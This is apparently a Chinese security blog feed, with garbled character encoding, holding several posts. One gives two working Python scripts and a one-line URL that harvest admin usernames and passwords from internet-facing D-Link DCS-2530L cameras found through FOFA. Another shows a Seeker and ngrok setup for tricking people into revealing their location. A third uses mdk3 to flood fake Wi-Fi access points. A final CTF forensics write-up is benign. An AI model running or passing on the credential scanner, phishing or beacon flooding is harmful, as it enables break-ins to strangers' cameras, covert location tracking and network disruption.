class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;D_link_IP.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">f1=<span class="built_in">open</span>(<span class="string">&quot;D_link.txt&quot;</span>,<span class="string">&quot;a+&quot;</span>)</span><br><span class="line">threads=[]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thread</span>(<span class="params">url,line_q,result_q</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">       result=requests.get(url,timeout=<span class="number">3</span>).text</span><br><span class="line">       finall=line_q+<span class="string">&quot;\n&quot;</span>+result</span><br><span class="line">       print(finall)</span><br><span class="line">       f1.write(finall+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">       print(<span class="string">&quot;error&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    line=line.strip()</span><br><span class="line">    tar=line+<span class="string">&quot;/config/getuser?index=0&quot;</span></span><br><span class="line">    t=threading.Thread(target=thread,args=(tar,line,Queue()))</span><br><span class="line">    t.start()</span><br><span class="line">    threads.append(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">    i.join()</span><br><span class="line">f1.close()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>ç„¶åæ ¹æ®å¯¹åº”æ‘„åƒå¤´çš„å‹å·åˆ°fofaä¸Šæœç´¢ï¼ˆè¿™é‡Œç”¨fofaé‡‡é›†å·¥å…·æ”¶é›†å¯¹åº”IP</p><blockquote><p>fofaè¯­æ³•ï¼šapp=â€D_Link-DCS-2530Lâ€</p></blockquote><p>é™„ä¸ŠVç¥çš„æ”¶é›†å·¥å…·ï¼š<a href="https://github.com/Vicl1fe/PeneS/releases/tag/1.2%EF%BC%88V%E7%A5%9E">https://github.com/Vicl1fe/PeneS/releases/tag/1.2ï¼ˆVç¥</a> yydsï¼Œç«‹é©¬ç‚¹ä¸ªstar</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/12855225969684.png"></p><p>Vç¥çš„pocï¼ˆå•çº¿ç¨‹æ¯”è¾ƒæ…¢å°±æ˜¯äº†ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">FOFA:app=&quot;D_Link-DCS-2530L&quot;</span></span><br><span class="line"><span class="string">By Vicl1fe</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;D_link_IP.txt&quot;</span></span><br><span class="line">header = &#123;<span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>&#125;</span><br><span class="line">proxy = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:1081&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https&quot;</span>:<span class="string">&quot;http://127.0.0.1:1081&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_url</span>():</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> i.startswith(<span class="string">&quot;http&quot;</span>):</span><br><span class="line">                result.append(<span class="string">&quot;http://&quot;</span>+i.strip())</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result.append(i.strip())</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">set</span>(result))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_admin_pass</span>(<span class="params">text</span>):</span></span><br><span class="line">    result = re.findall(<span class="string">r&quot;name=(.*?)\r\npass=(.*?)\r\npriv&quot;</span>,text)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">url_list</span>):</span></span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            html = requests.get(url+<span class="string">&quot;/config/getuser?index=0&quot;</span>,headers = header,verify=<span class="literal">False</span>,timeout=<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;name&quot;</span> <span class="keyword">in</span> html.text <span class="keyword">and</span> <span class="string">&quot;pass&quot;</span> <span class="keyword">in</span> html.text:</span><br><span class="line">                result = get_admin_pass(html.text)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(result) == <span class="number">1</span>:</span><br><span class="line">                    admin = result[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">                    admin_pass = result[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">                    print(url + <span class="string">&quot; è´¦å·ï¼š&#123;&#125;  å¯†ç ï¼š&#123;&#125;&quot;</span>.<span class="built_in">format</span>(admin,admin_pass))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(url + <span class="string">&quot; è·å–è´¦å·å¯†ç å¤±è´¥&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">url_list = get_all_url()</span><br><span class="line"><span class="comment"># url_list = [&quot;http://66.177.75.22/&quot;]</span></span><br><span class="line">exp(url_list)</span><br></pre></td></tr></table></figure><p>æˆ–è€…ç›´æ¥æ‰‹å·¥æ‰¾åˆ°ç›®æ ‡ç›´æ¥åŠ ä¸Špocï¼šhttp(s)://IP/config/getuser?index=0å³å¯å¾—åˆ°å¯†ç è¿›è¡Œç™»å½•</p><h2 id="æ•ˆæœå›¾"><a href="#æ•ˆæœå›¾" class="headerlink" title="æ•ˆæœå›¾"></a>æ•ˆæœå›¾</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210411561268546456.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1618220238(1).jpg" alt="xmsl"></p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¤¾ä¼šå·¥ç¨‹å­¦å·¥å…·Seeker+ngrok</title>
      <link href="2021/04/10/Seeker+ngrok/"/>
      <url>2021/04/10/Seeker+ngrok/</url>
      
        <content type="html"><![CDATA[<blockquote><p>åœ¨ç»´æŠ¤æ‰€è°“çš„æ­£ä¹‰çš„æ—¶å€™ï¼Œä¹Ÿè®¸æˆ‘ä»¬å·²ç»èµ°ä¸Šäº†é‚ªæ¶çš„é“è·¯</p></blockquote><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å­¦æ ¡åˆå¼€å§‹æ–­ç”µäº†qwq ï¼ï¼ï¼ï¼</p><p>åä¸€ç‚¹åŠå°±åªå¥½èººåºŠä¸Šåˆ·Bç«™ï¼Œç„¶åå°±å‘ç°äº†è¿™ä¸ªç¤¾å·¥å·¥å…·ï¼ˆä¸ªäººæ„Ÿè§‰è¿™å·¥å…·å°±TMDç‰¹åˆ«é¸¡è‚‹ï¼Œåœ¨æ­¤è¿›è¡Œæµ‹è¯•ï¼Œå¤§ä½¬å‹¿å–·~</p><h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><p>seekerä¸‹è½½åœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;github.com&#x2F;thewhiteh4t&#x2F;seeker</span><br></pre></td></tr></table></figure><p>å®‰è£…å‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 install.sh</span><br><span class="line">sudo .&#x2F;install</span><br></pre></td></tr></table></figure><p>ngrokä¸‹è½½åœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ngrok.com&#x2F;download</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šçš†æ˜¯åœ¨Linux-kaliä¸‹æ“ä½œ</p><h2 id="æ“ä½œè¿‡ç¨‹"><a href="#æ“ä½œè¿‡ç¨‹" class="headerlink" title="æ“ä½œè¿‡ç¨‹"></a>æ“ä½œè¿‡ç¨‹</h2><p>é¦–å…ˆæ‰“å¼€seekerè¿è¡Œå…¶pyè„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 seeker.py -t manual</span><br><span class="line">1&#x2F;&#x2F;è¿™é‡Œæˆ‘ä»¬é€‰ç”¨googleçš„æ¨¡æ¿</span><br><span class="line">URL : https:&#x2F;&#x2F;www.baidu.com&#x2F;&#x2F;è‡ªå·±éšä¾¿å†™ä¸ªéƒ½è¡Œï¼Œæˆ‘è¿™é‡Œæ˜¯é€‰æ‹©è·³è½¬åˆ°ç™¾åº¦</span><br></pre></td></tr></table></figure><p>æ¥ç€æ‰“å¼€ngrokï¼ˆè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨httpåè®®ã€8080ç«¯å£ï¼Œè¿è¡Œåä»–å°±ä¼šç”Ÿæˆé“¾æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;ngrok http 8080</span><br></pre></td></tr></table></figure><p>æœ€åæˆ‘ä»¬åªéœ€è¦å°†å…¶å‘ç»™æˆ‘ä»¬æƒ³è¦æµ‹(you)è¯•(pian)çš„äººå°±å®Œäº‹äº†ï¼Œé‚£ä¸ªé“¾æ¥ä½ å¯ä»¥æ”¹æˆçŸ­é“¾æ¥çœ‹è¿‡å»æ²¡é‚£ä¹ˆå‡ï¼ˆæ©è€³ç›—é“ƒ.jpgï¼‰</p><p>çœŸä»¥ä¸ºè¿™ç©æ„è¿™ä¹ˆç‰›æ°å—ï¼Ÿä½ è¿˜å¿˜äº†ç‚¹å•¥è€å“¥ï¼Œå¯¹æ–¹å¾—åŒæ„ä½ è·å–å…¶åœ°ç†ä½ç½®æƒé™ä½ æ‰èƒ½å¾—åˆ°å¯¹æ–¹ç›¸å…³ä¿¡æ¯ï¼</p><p>æ•ˆæœå›¾å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210409213148926.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/21251856665478.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/777202112612221021494645.png"></p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é’“é±¼ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€æ¬¡ç”Ÿæˆè™šå‡WiFi</title>
      <link href="2021/04/09/howtomakejiaWIFI/"/>
      <url>2021/04/09/howtomakejiaWIFI/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æ— è®ºä»€ä¹ˆæˆ˜æ–—ï¼Œå…‰é é˜²å®ˆæ˜¯èµ¢ä¸äº†çš„ï¼Œæƒ³è¦èµ¢ï¼Œå°±å¿…é¡»æ”»å‡»</p></blockquote><h2 id="å‰æœŸå‡†å¤‡"><a href="#å‰æœŸå‡†å¤‡" class="headerlink" title="å‰æœŸå‡†å¤‡"></a>å‰æœŸå‡†å¤‡</h2><p>kali + æ— çº¿ç½‘å¡</p><h2 id="æ“ä½œè¿‡ç¨‹"><a href="#æ“ä½œè¿‡ç¨‹" class="headerlink" title="æ“ä½œè¿‡ç¨‹"></a>æ“ä½œè¿‡ç¨‹</h2><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦è£…ä¸€ä¸‹mkd3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install mdk3</span><br></pre></td></tr></table></figure><p>æ¥ç€è¿ä¸‹æˆ‘ä»¬çš„æ— çº¿ç½‘å¡</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021040912342649536.png"></p><p>ç„¶åæˆ‘ä»¬ iwconfig æŸ¥çœ‹ä¸‹æ˜¯å¦çœŸçš„è¿ä¸Š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202104095266224656789.png"></p><p>æ·»åŠ mon0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iw wlan0 interface add mon0 type monitor</span><br><span class="line">iwconfig æ£€æµ‹ä¸€ä¸‹æ˜¯å¦æˆåŠŸ</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210421524416126972.png"></p><p>å¡«å†™WiFiåå­—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi wifi.lst</span><br><span class="line">è¾“å…¥iè¿›è¡Œç¼–è¾‘ï¼ˆå¦‚æœä½ ä¸çŸ¥é“çš„è¯æˆ‘ç»™ä½ æé†’ä¸€ä¸‹</span><br><span class="line">è¾“å…¥ä½ æƒ³è¦å–çš„WiFiåå­—</span><br><span class="line">Ctrl+C ç„¶å :wqæˆ–è€…:xå®ç°ä¿å­˜å¹¶é€€å‡ºï¼ˆå¦‚æœä½ ä¸çŸ¥é“çš„è¯æˆ‘ç»™ä½ æé†’ä¸€ä¸‹</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021040914614449.png"></p><p>æœ€åç”ŸæˆWiFi</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mdk3 mon0 b -f wifi.lst</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202104095582996.png"></p><p>so easyï¼ä½ ä¹Ÿæ¥è¯•è¯•â‘§ï¼ˆå¤§ä½¬å‹¿å–·~</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WiFi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çº¢æ˜è°·æ¯æ•°æ®å®‰å…¨å¤§èµ›æŠ€èƒ½åœºæ™¯èµ› 2021</title>
      <link href="2021/04/02/2021hmgbctf/"/>
      <url>2021/04/02/2021hmgbctf/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ¯”èµ›ä¸ªäººæ„Ÿè§‰å¾—æ‚é¡¹å¾—å¤©ä¸‹ï¼ˆå†å¤šåšå‡ºä¸€ä¸ªæ‚é¡¹æˆ‘ä»¬å°±èƒ½è¿›å†³èµ›äº†å‘€.jpg</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210402221912.png"></p><p>æˆ‘ä»¬å°±æ˜¯ç¬¬14~  é˜¿å·´é˜¿å·´é˜¿å·´</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/55543125064657497.png" alt="è£…ä¸ªé€¼"></p><h2 id="InputMonitor"><a href="#InputMonitor" class="headerlink" title="InputMonitor"></a>InputMonitor</h2><blockquote><p>Akiraåœ¨æŸæ¬¡å–è¯çš„è¿‡ç¨‹ä¸­ï¼Œåœ¨æ¡Œé¢æ‰¾åˆ°äº†ä¸€ä¸ªå¥‡æ€ªçš„æ–‡ä»¶ï¼Œä½†æ˜¯é™¤æ­¤ä¹‹å¤–å¥½åƒæ²¡æœ‰æ‰¾åˆ°ä»€ä¹ˆæœ‰ä»·å€¼çš„æƒ…æŠ¥ï¼Œå¾ˆå¤šçš„æ•°æ®éƒ½è¢«æŠ¹å¹²å‡€äº†ï¼Œè€Œä¸”è¿™ä¸ªç”¨æˆ·ä¼¼ä¹æ ¹æœ¬å°±æ²¡è£…ä»€ä¹ˆç¬¬ä¸‰æ–¹çš„è½¯ä»¶ã€‚Akiraè¿˜ç²—å¿ƒçš„åªæ‹·è´äº†Cç›˜ä¸‹çš„Userç›®å½•ï¼Œè¿™ä¸‹è¿˜æœ‰æœºä¼šè§£å¼€å¯ç–‘æ–‡ä»¶å—ï¼Ÿ</p><p><a href="https://pan.baidu.com/s/1l79sUCGe393kGELdoXyTEA">é™„ä»¶</a>ï¼ˆæå–ç ï¼šehdyï¼‰</p></blockquote><p>ç¬¬ä¸€æ¬¡åšå–è¯çš„é¢˜ç›®è®°å½•ä¸€ä¸‹</p><p>é¦–å…ˆæˆ‘ä»¬å¾—æœç´¢ç›®æ ‡ç”¨æˆ·ï¼Œåœ¨å…¶æ¡Œé¢æ–‡ä»¶å¤„å‘ç°flagæ–‡ä»¶ï¼ˆä¸€ä¸ªåŠ å¯†çš„åŒ…ï¼›å¹¶æç¤ºæˆ‘ä»¬è¯´ç›‘æ§æˆ‘è¾“å…¥</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210402425265621041.png"></p><p>è´´ä¸ªå‚è€ƒæ–‡ç« ï¼š<a href="http://www.huaxindc.com/ztxy/ztjc/2020/1028/19459.html">http://www.huaxindc.com/ztxy/ztjc/2020/1028/19459.html</a></p><p>æ¥ç€æˆ‘ä»¬éœ€è¦æ‰¾å¯»å¯†ç ï¼Œæ‰¾åˆ°æ–‡ä»¶ ChsPinyinlH.dat æˆ– ChsPinyinUDL.datï¼ˆå’±ä¹Ÿä¸çŸ¥é“.datæ–‡ä»¶æ˜¯å•¥</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hmgb2021ChsPinyinIHdat.png"></p><p>æ‰¾åˆ°1400hå¤„ï¼Œå…¶åä¾¿æ˜¯æ¯4ä¸ªå­—èŠ‚æ˜¯å­—æ•°ï¼Œåé¢å››ä¸ªä¸çŸ¥é“ï¼Œå†å››ä¸ªæ˜¯è¾“å…¥æ¬¡æ•°ï¼Œå†24å­—èŠ‚æ˜¯å†…å®¹ï¼Œå†24å­—èŠ‚ä¹Ÿæ˜¯å†…å®¹ï¼Œä»¥æ­¤ä¸ºä¸€ä¸ªå¾ªç¯ï¼›ä¹‹ååˆé‡æ–°å¼€å§‹å¾ªç¯ï¼ˆå°±ç­‰äºä¸€ä¸ªstruct é“¾è¡¨</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2377878882782421.png"></p><p>utf16è½¬ä¸€ä¸‹è¿›è€Œå¾—åˆ°å¯†ç ï¼šæœ‰å¿—è€…äº‹ç«Ÿæˆï¼ˆPSï¼šç›´æ¥ç”¨CyberChefä¼šå¿«äº›</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210402251088812566455.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4594594646.png"></p><p>æˆ–è€…åˆ©ç”¨å·¥å…·å¾—åˆ°å¯†ç </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210402412524514145561.png"></p><p>æœ€åæˆåŠŸå¾—åˆ°hidden.pdfï¼Œæ‰“å¼€ä¹‹åç¼–è¾‘å›¾ç‰‡å³å¯çœ‹åˆ°flagï¼šflag{Y0u_F1nd_h1dd3n_m3g}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021040219679197713.png"></p><h2 id="èµ›åå¤ç°"><a href="#èµ›åå¤ç°" class="headerlink" title="èµ›åå¤ç°"></a>èµ›åå¤ç°</h2><h3 id="æˆ‘çš„å¿ƒæ˜¯å†°å†°çš„"><a href="#æˆ‘çš„å¿ƒæ˜¯å†°å†°çš„" class="headerlink" title="æˆ‘çš„å¿ƒæ˜¯å†°å†°çš„"></a>æˆ‘çš„å¿ƒæ˜¯å†°å†°çš„</h3><p> Javaç›²æ°´å°å¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼šgnibgnib</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar BlindWatermark-v0.0.3-windows-x86_64.jar decode -c bingbing.jpg pass.jpg</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hmgbbingbingpass.jpg"></p><p>è§£å‡ºä¸€ä¸ªæµé‡åŒ…ï¼Œwiresharkæ‰“å¼€å¾—çŸ¥æ˜¯USBæµé‡</p><p> tshark + USB Keyboard Data Hacker + hexè§£ç å¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">tshark.exe -r bingbing.pcapng -T fields -e usb.capdata &gt; usbdata.txt</span><br><span class="line"></span><br><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000060000000000</span><br><span class="line">0000230000000000</span><br><span class="line">00001e0000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000240000000000</span><br><span class="line">0000240000000000</span><br><span class="line">0000050000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000250000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000220000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001f0000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000220000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">00001f0000000000</span><br><span class="line">00002a0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001e0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000230000000000</span><br><span class="line">00001e0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000250000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000270000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000220000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001f0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000270000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000220000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001e0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001f0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000240000000000</span><br><span class="line">0000070000000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">666c61677b38663965643266393333656631346138643035323364303334396531323939637d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag&#123;8f9ed2f933ef14a8d0523d0349e1299c&#125;</span><br></pre></td></tr></table></figure><h3 id="æ­ªæ¯”æ­ªæ¯”"><a href="#æ­ªæ¯”æ­ªæ¯”" class="headerlink" title="æ­ªæ¯”æ­ªæ¯”"></a>æ­ªæ¯”æ­ªæ¯”</h3><p>010æ‰“å¼€å‘ç°æ˜¯ä¸ªæµé‡åŒ…ï¼Œwiresharkæ‰“å¼€å‘ç°å…³é”®ä¿¡æ¯ï¼ˆçŸ¥é“æ˜¯å“ˆå¤«æ›¼ä½†æ˜¯æ²¡åš.jpg</p><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/81345614970.jpg"></h3><p>è·‘ä¸‹è„šæœ¬å³å¯å¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Decode 